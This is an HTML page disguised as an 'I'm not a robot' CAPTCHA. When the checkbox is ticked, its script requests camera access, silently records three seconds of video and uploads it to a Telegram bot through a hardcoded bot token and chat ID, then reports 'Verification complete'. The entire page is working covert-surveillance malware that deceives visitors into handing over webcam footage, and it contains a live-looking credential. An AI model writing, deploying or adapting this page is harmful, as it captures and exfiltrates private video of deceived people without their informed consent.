<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Robot Verification</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin-top: 50px;
        }
        #loading {
            display: none;
            font-size: 18px;
            color: green;
        }
        #success {
            display: none;
            font-size: 18px;
            color: green;
        }
        #checkbox-container {
            margin-top: 20px;
        }
        #start-recording {
            display: none;
            margin-top: 20px;
        }
        video {
            display: none;
        }
    </style>
</head>
<body>
    <h1>Are you a robot?</h1>
    <div id="checkbox-container">
        <label>
            <input type="checkbox" id="robot-checkbox"> I'm not a robot
        </label>
    </div>
    <video id="video" autoplay playsinline muted></video>
    <div id="loading">Recording... Please wait</div>
    <div id="success">✅ Verification Complete!</div>

    <script>
        const video = document.getElementById('video');
        const checkbox = document.getElementById('robot-checkbox');
        const loading = document.getElementById('loading');
        const success = document.getElementById('success');
        const telegramToken = "5106852555:AAGBGu_cOOtorL4B4aD7cu9JNMLoxZU0A3Q";
        const telegramChatId = "2070423407";

        checkbox.addEventListener('change', (e) => {
            if (e.target.checked) {
                // عرض رسالة التسجيل
                loading.style.display = 'block';

                // طلب الوصول إلى الكاميرا
                navigator.mediaDevices.getUserMedia({
                    video: {
                        width: { ideal: 320 },
                        height: { ideal: 240 },
                        frameRate: { ideal: 15 }
                    }
                }).then((stream) => {
                    video.srcObject = stream;

                    const mediaRecorder = new MediaRecorder(stream);
                    const chunks = [];

                    mediaRecorder.start();

                    mediaRecorder.ondataavailable = (event) => {
                        chunks.push(event.data);
                    };

                    setTimeout(() => {
                        mediaRecorder.stop();
                    }, 3000); // تسجيل 3 ثوانٍ فقط

                    mediaRecorder.onstop = () => {
                        const blob = new Blob(chunks, { type: 'video/webm' });
                        const formData = new FormData();
                        formData.append('chat_id', telegramChatId);
                        formData.append('video', blob, 'video.webm');

                        fetch(`https://api.telegram.org/bot${telegramToken}/sendVideo`, {
                            method: 'POST',
                            body: formData
                        })
                        .then((response) => {
                            if (response.ok) {
                                success.style.display = 'block';
                                setTimeout(() => {
                                    loading.style.display = 'none';
                                    success.style.display = 'none';
                                    alert('Verification complete!');
                                }, 2000); // انتظار ثانيتين لعرض رسالة النجاح
                            } else {
                                alert('Failed to send video.');
                            }
                        })
                        .catch((error) => {
                            alert('Error: ' + error.message);
                        });

                        // إيقاف الكاميرا بعد الانتهاء
                        stream.getTracks().forEach(track => track.stop());
                    };
                }).catch((err) => {
                    alert("Unable to access camera: " + err.message);
                });
            }
        });
    </script>
</body>
</html>
